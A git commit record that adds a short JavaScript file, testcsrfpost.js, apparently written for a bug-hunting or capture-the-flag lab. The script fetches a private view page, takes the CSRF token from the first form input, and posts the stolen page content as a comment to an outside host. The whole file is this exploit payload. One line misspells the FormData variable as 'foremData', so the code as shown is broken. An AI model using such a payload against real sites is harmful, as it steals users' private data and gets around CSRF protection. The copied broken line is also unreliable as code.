8dc44de647d60caee7831ca67c4bba0b8ca1b8d8
/hello <czavaleta93@gmail.com>
2021-11-03 19:37:45 -0500

    Create testcsrfpost.js

---
+++ testcsrfpost.js
@@ -0,0 +1,16 @@
+fetch("/view/1ae3783c-3ca2-4c4f-8d23-70507dfcca93").then((res) => {
+	return res.text();
+}).then(data => {
+	var csrf = document.getElementsByTagName("input")[0].value;
+	var formData = new FormData();
+
+	formData.append("csrfmiddlewaretoken", csrf);
+	formData.append("creator", "fromBot");
+	foremData.append("body", data);
+
+	fetch("https://hackedabacus.br2.bughuntr.net/comment/99760eaf-4592-4bc0-a1f5-a264fc4644ef",{
+		method: 'POST',
+		body: formData
+	});
+
+})
